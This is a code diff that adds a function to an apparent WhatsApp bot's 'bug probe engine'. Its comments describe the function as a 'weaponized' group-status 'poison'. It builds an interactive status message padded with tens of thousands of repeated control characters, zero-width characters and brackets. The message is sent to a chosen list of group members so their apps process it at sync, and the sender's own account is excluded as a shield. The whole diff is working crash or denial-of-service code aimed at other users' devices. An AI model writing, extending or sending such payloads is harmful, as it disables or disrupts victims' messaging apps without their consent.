@@ -492,6 +492,69 @@ export function createBugProbeEngine(deps) {
         return { wireBytes, ids: rid ? [rid] : [], status: true };
     }
 
+    // 🧪 GROUP STATUS BUG — Squichy gcstatus recipe weaponized: the proven
+    // groupStatusMessageV2/interactiveMessage poison dressed as a GROUP STATUS
+    // (contextInfo.isGroupStatus + member mentions, like .gcstatus) and posted
+    // through the STATUS pipeline with an EXPLICIT audience list. Because the
+    // audience is caller-defined, the bot's own account can be excluded from
+    // it — the self-shield .gb-hard can never have (group sends fan out to
+    // every member device). Each member's app processes the status eagerly at
+    // sync (status tray + group album + mention notification).
+    async function sendGbStatusProbe(prim, groupJid, audience) {
+        const payload = {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveMessage: {
+                        // Squichy gcstatus dressing — makes clients render this
+                        // into the group status album, not just a group message.
+                        contextInfo: {
+                            mentionedJid: audience,
+                            isGroupStatus: true
+                        },
+                        header: {
+                            title: "𑇂𑆴𑆿".repeat(10000),
+                            subtitle: "\x10".repeat(50000),
+                            bloksWidget: {
+                                uuid: "\u200B".repeat(50000),
+                                data: "[".repeat(50000),
+                                type: "\u200F".repeat(50000),
+                                fallback: "\u200D".repeat(50000)
+                            }
+                        },
+                        body: { text: "\u000F" },
+                        nativeFlowMessage: {
+                            buttons: "[".repeat(50000)
+                        }
+                    }
+                }
+            }
+        };
+        const wireBytes = wireBytesOf(payload);
+        const rid = await prim.relayMessage('status@broadcast', payload, {
+            // ONLY these devices receive the status — the handler passes the
+            // member list MINUS the bot's own account (the shield).
+            statusJidList: audience,
+            // "tagged a group in the status" association (fork statusMention
+            // node shape, pointed at the group).
+            additionalNodes: [
+                {
+                    tag: 'meta',
+                    attrs: {},
+                    content: [
+                        {
+                            tag: 'mentioned_users',
+                            attrs: {},
+                            content: [
+                                { tag: 'to', attrs: { jid: groupJid }, content: undefined }
+                            ]
+                        }
+                    ]
+                }
+            ]
+        });
+        return { wireBytes, ids: rid ? [rid] : [], status: true };
+    }
+
     return Object.freeze({
         bugSendsPath,
         loadBugSends,
@@ -507,6 +570,7 @@ export function createBugProbeEngine(deps) {
         buildTestfffMessage,
         prepareCardImage,
         sendGbHardProbe,
-        sendStatusBugProbe
+        sendStatusBugProbe,
+        sendGbStatusProbe
     });
 }
